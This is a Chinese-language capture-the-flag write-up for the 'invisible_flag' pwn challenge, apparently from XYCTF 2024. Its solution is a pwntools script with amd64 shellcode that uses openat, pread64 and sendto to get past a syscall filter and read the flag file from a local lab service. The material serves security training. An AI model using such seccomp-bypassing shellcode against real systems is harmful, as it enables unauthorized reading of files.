# invisible_flag

> 分类：Pwn

## 题目描述
shellcode 题，但函数受限，需要用 openat、pread64 和 sendto 进行 ORW 读取 flag。

## 考察知识点
- shellcode
- 受限的 syscall
- openat / pread64 / sendto 组合的 ORW

## 解法
通过 shellcode 进行 orw，对函数有限制因此使用了 openat、pread64 和 sendto。

```python
from pwn import *
import os

context.os = 'linux'
context.arch = 'amd64'

os.chdir('./bin')
#sh = process('./vuln')
sh = remote('127.0.0.1',11036)

'''
openat(-100,'flag',0,0)
pread64(3,0x114514500,64,0)
sendto(1,0x114514500,64,0,0,0)
'''

#sendto无法在本地打通 只能打远程

shellcode = '''
mov rax,257
mov rdi,-100
push 0x67616c66
mov rsi,rsp
xor rdx,rdx
xor r10,r10
syscall

mov rax,17
mov rdi,3
mov rsi,0x114514500
mov rdx,64
xor r10,r10
syscall

mov rax,44
mov rdi,1
mov rsi,0x114514500
mov rdx,64
xor r10,r10
xor r9,r9
xor r8,r8
syscall

'''

shellcode = asm(shellcode)
sh.send(shellcode)

sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
